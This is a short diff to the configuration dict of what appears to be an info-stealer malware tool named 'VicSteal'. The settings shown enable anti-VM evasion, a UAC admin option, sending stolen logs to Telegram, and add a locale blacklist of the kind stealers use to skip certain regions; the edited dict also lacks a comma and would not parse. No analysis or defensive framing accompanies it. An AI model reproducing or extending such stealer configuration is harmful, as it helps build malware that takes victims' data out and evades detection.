@@ -1,5 +1,9 @@
-config: dict[str, str] = {
+config = {
   "logFileName": f"VicSteal-New-Log",
+  "BLACKLIST": [
+    "ar-ma",
+    'en-ma'
+  ]
   "UACAdmin": False,
   "antiVM": True,
   "sendToTelegram": True,
